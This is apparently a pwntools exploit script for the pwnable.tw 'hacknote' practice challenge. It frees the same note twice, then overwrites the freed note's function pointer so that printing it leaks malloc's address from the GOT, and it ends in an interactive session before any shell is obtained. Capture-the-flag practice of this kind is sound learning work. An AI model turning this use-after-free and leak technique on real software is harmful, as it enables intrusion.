#!/usr/bin/env python2
# -*- coding: utf-8 -*-
from pwn import *

exe = context.binary = ELF('hacknote')

host = args.HOST or 'chall.pwnable.tw'
port = int(args.PORT or 10102)

def local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return local(argv, *a, **kw)
    else:
        return remote(argv, *a, **kw)

context.terminal = ['gnome-terminal', '-e']
gdbscript = '''
break *0x0804893D
continue
'''.format(**locals())

# -- Exploit goes here --

def add_note(size, content):
    io.sendafter(':', '1')
    io.sendafter(':', str(size))
    io.sendafter(':', str(content))

def delete_note(index):
    io.sendafter(':', '2')
    io.sendafter(':', str(index))

def print_note(index):
    io.sendafter(':', '3')
    io.sendafter(':', str(index))

io = start()

add_note(0x200, "simple content")
delete_note(0)
delete_note(0)

# this is the print function used by the program to print notes
# it takes as input ptr[i] and displays
# ptr[i] + 4 bytes
# that means it should display the second member
# of the structure
puts_wrapper = 0x0804862B
add_note(8, p32(puts_wrapper) + p32(exe.got['malloc']))
print_note(0)

addr = u32(io.recvline()[:4])
log.success('malloc address: {}'.format(hex(addr)))

io.interactive()

